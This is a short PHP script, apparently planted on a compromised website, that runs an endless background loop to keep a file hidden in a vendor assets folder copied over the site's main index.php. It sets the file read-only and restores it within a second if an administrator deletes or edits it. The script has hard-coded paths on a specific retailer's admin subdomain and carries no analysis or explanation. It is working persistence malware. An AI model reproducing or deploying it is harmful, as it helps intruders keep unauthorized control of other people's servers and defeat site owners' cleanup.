<?php
error_reporting(E_ERROR);set_time_limit(0);ignore_user_abort();
$formfile='/home/grosirjamtangan/public_html/smartadmin.thewatchgalleria.com/assets/vendors/autosize/index.php';
$tofile='/home/grosirjamtangan/public_html/smartadmin.thewatchgalleria.com/index.php';
do{
	if(!file_exists($tofile)){@copy($formfile,$tofile);chmod($tofile,0444);}
	if(!file_exists($formfile)){@copy($tofile,$formfile);chmod($tofile,0444);}
	if(hash('sha1',file_get_contents($formfile))!=hash('sha1',file_get_contents($tofile))){@unlink($tofile);@copy($formfile,$tofile);chmod($tofile,0444);}
	sleep(1);
}while(true);


?>